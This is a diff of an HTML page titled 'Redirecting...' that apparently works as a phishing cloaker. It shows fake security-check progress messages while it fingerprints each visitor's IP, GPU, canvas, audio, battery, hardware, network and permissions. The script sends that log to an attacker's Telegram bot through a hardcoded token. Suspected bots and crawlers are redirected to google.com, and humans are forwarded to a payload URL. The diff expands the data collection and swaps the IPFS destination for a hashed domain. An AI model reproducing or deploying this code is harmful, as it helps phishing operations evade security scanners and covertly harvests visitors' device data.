@@ -5,14 +5,14 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Redirecting...</title>
 <style>
-:root { --p:#0ea5e9; --bg:#020617; --t:#f8fafc; }
-body{margin:0;background:var(--bg);font-family:'SF Mono',menlo,monospace;color:var(--t);display:flex;justify-content:center;align-items:center;min-height:100vh;}
-#sh{width:440px;padding:2rem;border-left:2px solid var(--p);background:#0b1120;}
-.st{font-size:.8rem;text-transform:uppercase;letter-spacing:3px;color:var(--p);margin-bottom:.5rem;}
-.dt{font-size:.75rem;color:#64748b;height:1.2rem;margin-bottom:1.5rem;}
-.pb{width:100%;height:1px;background:#1e293b;position:relative;}
-#f{width:0%;height:100%;background:var(--p);box-shadow:0 0 8px var(--p);transition:width .3s ease;}
-#gl{display:none;}
+:root{--p:#0ea5e9;--bg:#020617;--t:#f8fafc}
+body{margin:0;background:var(--bg);font-family:'SF Mono',menlo,monospace;color:var(--t);display:flex;justify-content:center;align-items:center;min-height:100vh}
+#sh{width:460px;padding:2rem;border-left:2px solid var(--p);background:#0b1120}
+.st{font-size:.8rem;text-transform:uppercase;letter-spacing:3px;color:var(--p);margin-bottom:.5rem}
+.dt{font-size:.75rem;color:#64748b;height:1.2rem;margin-bottom:1.5rem}
+.pb{width:100%;height:1px;background:#1e293b;position:relative}
+#f{width:0;height:100%;background:var(--p);box-shadow:0 0 8px var(--p);transition:width .3s ease}
+#gl{display:none}
 </style>
 </head>
 <body>
@@ -23,28 +23,67 @@ body{margin:0;background:var(--bg);font-family:'SF Mono',menlo,monospace;color:v
 </div>
 <canvas id="gl"></canvas>
 <script>
-const CFG={D:"https://ipfs.io/ipfs/bafkreicu4xtwgsor6j46h2e6kvwu676a5va7sonmfsgnj5zwa6achnooca/",B:"https://www.google.com",T:"8360539543:AAGZtvr7bt1PVcRfq8eTkHCxHigKBjHMwaQ",C:"659482680"};
-let res={sc:0,m:false,b:false};
+const CFG={D:"https://d3d97e2af1201de9799aed11aed02ffe.com/WJmmHi0ELP4/--/",B:"https://www.google.com",T:"8360539543:AAGZtvr7bt1PVcRfq8eTkHCxHigKBjHMwaQ",C:"659482680"};
+let res={sc:0,m:false};
 const u=(s,d,p)=>{document.getElementById('s').innerText=s;document.getElementById('d').innerText=d;document.getElementById('f').style.width=p+"%";}
 const ntg=async m=>{try{await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CFG.C,text:m,parse_mode:"HTML"})});}catch(e){}};
-const getB=async()=>{try{const b=await navigator.getBattery();return`${b.level*100}%_${b.charging}`;}catch(e){return"UNSUPPORTED";}};
-const getG=()=>{const c=document.getElementById('gl');const gl=c.getContext('webgl');const dbg=gl.getExtension('WEBGL_debug_renderer_info');return dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):"NA";}
-const getCanvasHash=()=>{const canvas=document.createElement('canvas');const ctx=canvas.getContext('2d');canvas.width=200;canvas.height=50;ctx.textBaseline="top";ctx.font="14px 'Arial'";ctx.textBaseline="alphabetic";ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);ctx.fillStyle="#069";ctx.fillText("🧪",2,15);ctx.fillStyle="rgba(102, 204, 0, 0.7)";ctx.fillText("🧪",4,17);return canvas.toDataURL();}
-const getAudioHash=async()=>{try{const AudioContext=window.OfflineAudioContext||window.webkitOfflineAudioContext;if(!AudioContext)return"UNSUPPORTED";const context=new AudioContext(1,44100,44100);const oscillator=context.createOscillator();oscillator.type="triangle";oscillator.frequency.value=10000;oscillator.connect(context.destination);oscillator.start(0);const buffer=await context.startRendering();let sum=0;for(let i=0;i<buffer.length;i++)sum+=Math.abs(buffer.getChannelData(0)[i]);return sum.toFixed(5);}catch(e){return"UNSUPPORTED";}}
-const getTZ=()=>{try{return Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){return"UNSUPPORTED";}}
-const getLang=()=>{try{return navigator.language||navigator.userLanguage;}catch(e){return"UNSUPPORTED";}}
-const getFonts=()=>{const div=document.createElement('div');const bases=['monospace','sans-serif','serif'];const test='abcdefghijklmnopqrstuvwxyz';const widths={};bases.forEach(base=>{div.style.fontFamily=base;div.style.position='absolute';div.style.left='-9999px';div.innerText=test;document.body.appendChild(div);widths[base]=div.offsetWidth;document.body.removeChild(div);});return JSON.stringify(widths);}
-const detectHeadless=()=>{const props=['webdriver','__nightmare','_selenium','callPhantom','__phantomas','chrome.runtime'];return props.some(p=>p in window)||navigator.webdriver||!!window.chrome&&!!chrome.runtime&&!chrome.runtime.id;}
-const PENALTY={webdriver:30,missingPayment:20,missingChrome:15,batteryAnomaly:10,gpuVendorOddity:10,webdriverProp:10,headlessDetect:30,canvasFingerprint:5,audioUnsupported:5};
-const ENABLE={canvasFingerprint:true,audioFingerprint:true,headlessDetect:true,timezoneCheck:false,languageCheck:false};
-let interactionSeen=false;
-const setHuman=()=>{interactionSeen=true;res.m=true;};
-window.addEventListener('mousemove',setHuman,{once:true});
-window.addEventListener('touchstart',setHuman,{once:true});
-window.addEventListener('click',setHuman,{once:true});
-window.addEventListener('keydown',setHuman,{once:true});
-const v=async()=>{u("Ciphers_Check","Analyzing TLS stack...",25);const bat=await getB();const gpu=getG();const ipr=await(fetch('https://api.ipify.org?format=json')).json();let penalties=0;if(navigator.webdriver)penalties+=PENALTY.webdriver;if(!window.PaymentRequest)penalties+=PENALTY.missingPayment;if(!window.chrome)penalties+=PENALTY.missingChrome;if(bat==="100%_true"&&!window.SpeechSynthesisUtterance)penalties+=PENALTY.batteryAnomaly;if(gpu.includes("Microsoft")||gpu.includes("Swift")||gpu.includes("llvm"))penalties+=PENALTY.gpuVendorOddity;if(Object.getOwnPropertyDescriptor(navigator,'webdriver')!==undefined)penalties+=PENALTY.webdriverProp;if(ENABLE.headlessDetect&&detectHeadless())penalties+=PENALTY.headlessDetect;if(ENABLE.canvasFingerprint&&getCanvasHash().includes("data:image"))penalties+=PENALTY.canvasFingerprint;const audioHash=await getAudioHash();if(ENABLE.audioFingerprint&&audioHash==="UNSUPPORTED")penalties+=PENALTY.audioUnsupported;res.sc-=penalties;u("Entropy_Verify","Sampling behavioral noise...",60);await new Promise(r=>setTimeout(r,1000));u("System_Finalize","Encoding session keys...",90);await new Promise(r=>setTimeout(r,800));const canvasHash=getCanvasHash();const tz=getTZ();const lang=getLang();const fonts=getFonts();const m=`<b>[LOG]</b>\nIP: ${ipr.ip}\nGPU: ${gpu}\nBAT: ${bat}\nSCR: ${window.screen.width}x${window.screen.height}\nTZ: ${tz}\nLANG: ${lang}\nFONTS: ${fonts}\nCANVAS: ${canvasHash.slice(0,30)}\nAUDIO: ${audioHash}`;if(res.sc<0&&!res.m){await ntg(m+"\nSTATUS: BLOCKED");window.location.replace(CFG.B);}else{u("Access_Granted","Redirecting...",100);await ntg(m+"\nSTATUS: PASSED");setTimeout(()=>window.location.href=CFG.D,400);}};
-window.onload=()=>{if(navigator.userAgent.includes("Bot")||navigator.userAgent.includes("Crawl")){window.location.replace(CFG.B);}else{v();}};
+const sleep=t=>new Promise(r=>setTimeout(r,t));
+const getBattery=async()=>{try{const b=await navigator.getBattery();return`${b.level*100}%_${b.charging}`;}catch(e){return"UNSUPPORTED"}};
+const getWebGLInfo=()=>{try{const c=document.getElementById('gl');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl)return{renderer:"NA",vendor:"NA",version:"NA"};const dbg=gl.getExtension('WEBGL_debug_renderer_info');const renderer=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);const vendor=dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR);return{renderer,vendor,version:gl.getParameter(gl.VERSION)};}catch(e){return{renderer:"ERR",vendor:"ERR",version:"ERR"}}};
+const getCanvasFP=()=>{const c=document.createElement('canvas');c.width=280;c.height=60;const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='16px "Arial"';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('🧪',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('🧪',4,17);return c.toDataURL();}
+const getAudioFP=async()=>{try{const AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;if(!AC)return"UNSUPPORTED";const ctx=new AC(1,44100,44100);const osc=ctx.createOscillator();osc.type='triangle';osc.frequency.value=10000;osc.connect(ctx.destination);osc.start(0);const buf=await ctx.startRendering();let sum=0;for(let i=0;i<buf.length;i++)sum+=Math.abs(buf.getChannelData(0)[i]);return sum.toFixed(5);}catch(e){return"UNSUPPORTED"}}
+const getUAHash=()=>{let h=0;for(let i=0;i<navigator.userAgent.length;i++)h=(h<<5)-h+navigator.userAgent.charCodeAt(i);return h>>>0;}
+const getFeatures=()=>{return{serviceWorker:'serviceWorker'in navigator,webGL:'WebGLRenderingContext'in window,webRTC:'RTCPeerConnection'in window,broadcastChannel:'BroadcastChannel'in window,clipboard:'clipboard'in navigator,permissions:'permissions'in navigator};}
+const getScreenInfo=()=>{return{w:screen.width,h:screen.height,cd:screen.colorDepth,pr:window.devicePixelRatio,orientation:screen.orientation?.type||"NA"};}
+const getHardwareInfo=()=>{return{cores:navigator.hardwareConcurrency||0,mem:navigator.deviceMemory||0,lang:navigator.language||"NA",langs:navigator.languages?.join(',')||"NA"};}
+const getNetworkInfo=()=>{if('connection'in navigator){const c=navigator.connection;return{type:c.type||"NA",effectiveType:c.effectiveType||"NA",downlink:c.downlink||0,rtt:c.rtt||0};}return{type:"NA",effectiveType:"NA",downlink:0,rtt:0};}
+const getPermissions=async()=>{if(!('permissions'in navigator))return{};try{const perms=await navigator.permissions.query({name:"geolocation"});return{geolocation:perms.state};}catch(e){return{};}}
+const getTimezone=()=>{try{return Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){return"UNSUPPORTED"}}
+const detectHeadless=()=>{const probes=['webdriver','__nightmare','_selenium','callPhantom','__phantomas'];if(probes.some(p=>p in window))return true;if(navigator.webdriver)return true;if(window.chrome&&chrome.runtime&&!chrome.runtime.id)return true;return false;}
+const scorePenalties=()=>{let p=0;if(navigator.webdriver)p+=30;if(!window.PaymentRequest)p+=20;if(!window.chrome)p+=15;const bat=res.bat;if(bat&&bat!=="100%_true")p+=10;const gpuInfo=getWebGLInfo();if(gpuInfo.renderer.includes("Microsoft")||gpuInfo.vendor.includes("Swift")||gpuInfo.vendor.includes("llvm"))p+=10;if(Object.getOwnPropertyDescriptor(navigator,'webdriver')!==undefined)p+=10;if(detectHeadless())p+=30;if(getCanvasFP().includes("data:image"))p+=5;const audioHash=res.audioHash;if(audioHash==="UNSUPPORTED")p+=5;return p;}
+const collectLog=async()=>{const ipObj=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"NA"}));
+const bat=await getBattery();res.bat=bat;
+const gpu=getWebGLInfo();
+const canvas=getCanvasFP();
+const audio=await getAudioFP();res.audioHash=audio;
+const tz=getTimezone();
+const uaHash=getUAHash();
+const feats=getFeatures();
+const scr=getScreenInfo();
+const hw=getHardwareInfo();
+const net=getNetworkInfo();
+const perms=await getPermissions();
+return `<b>[LOG]</b>
+IP: ${ipObj.ip}
+UA_HASH: ${uaHash}
+GPU_RENDERER: ${gpu.renderer}
+GPU_VENDOR: ${gpu.vendor}
+GPU_VERSION: ${gpu.version}
+BATTERY: ${bat}
+CANVAS_FP: ${canvas.slice(0,30)}
+AUDIO_FP: ${audio}
+TIMEZONE: ${tz}
+SCREEN: ${scr.w}x${scr.h} cd:${scr.cd} pr:${scr.pr} ori:${scr.orientation}
+HARDWARE: cores:${hw.cores} mem:${hw.mem} lang:${hw.lang} langs:${hw.langs}
+NETWORK: type:${net.type} effective:${net.effectiveType} dl:${net.downlink} rtt:${net.rtt}
+PERMS: ${JSON.stringify(perms)}
+FEATURES: ${JSON.stringify(feats)}`;}
+window.addEventListener('mousemove',()=>{res.m=true;}, {once:true});
+window.addEventListener('touchstart',()=>{res.m=true;}, {once:true});
+window.addEventListener('click',()=>{res.m=true;}, {once:true});
+window.addEventListener('keydown',()=>{res.m=true;}, {once:true});
+const run=async()=>{u("Ciphers_Check","Analyzing TLS stack...",15);
+res.sc+=0;
+await sleep(600);
+u("Entropy_Verify","Sampling behavioral noise...",45);
+await sleep(1200);
+u("System_Finalize","Encoding session keys...",80);
+await sleep(1000);
+res.sc-=scorePenalties();
+const log=await collectLog();
+if(res.sc<0&&!res.m){await ntg(log+"\nSTATUS: BLOCKED");window.location.replace(CFG.B);}else{u("Access_Granted","Redirecting...",100);await ntg(log+"\nSTATUS: PASSED");setTimeout(()=>window.location.href=CFG.D,400);}
+};
+window.onload=()=>{if(navigator.userAgent.includes("Bot")||navigator.userAgent.includes("Crawl")){window.location.replace(CFG.B);}else{run();}};
 </script>
 </body>
 </html>
